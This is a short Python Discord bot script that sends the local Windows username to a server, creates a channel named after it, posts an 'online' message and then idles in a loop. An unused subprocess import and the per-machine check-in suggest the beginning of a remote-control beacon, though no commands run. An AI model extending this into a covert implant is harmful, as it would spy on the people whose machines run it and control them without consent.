import os
import discord
import asyncio
import subprocess
from discord.ext import commands

TOKEN = "DISCORD BOT TOKEN HERE"
USERNAME = os.getenv("USERNAME")  # Windows username
GUILD_ID = "DISCORD SERVER ID HERE | make it a interger"  # Replace with your actual server ID

# Bot setup with proper intents
intents = discord.Intents.default()
intents.messages = True  # Required for reading messages
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

async def main_loop():
    """Main loop of the program"""
    while True:
        print("Hallo")
        await asyncio.sleep(5)  # Wait for 5 seconds

@bot.event
async def on_ready():
    print(f'✅ Bot connected as {bot.user}')
    
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("❌ Error: Bot is not in the specified guild or missing permissions.")
        return
    
    print(f'✅ Bot found guild: {guild.name} ({guild.id})')

    # Find or create a text channel based on the username
    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")

    if not channel:
        channel = await guild.create_text_channel(f"{USERNAME}")
        print(f"✅ Created channel: {channel.name}")

    await channel.send(f"{USERNAME} is online ✅")
    print(f"✅ {USERNAME} sent a message.")

    # Start the main loop
    bot.loop.create_task(main_loop())

# Run the bot securely
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")
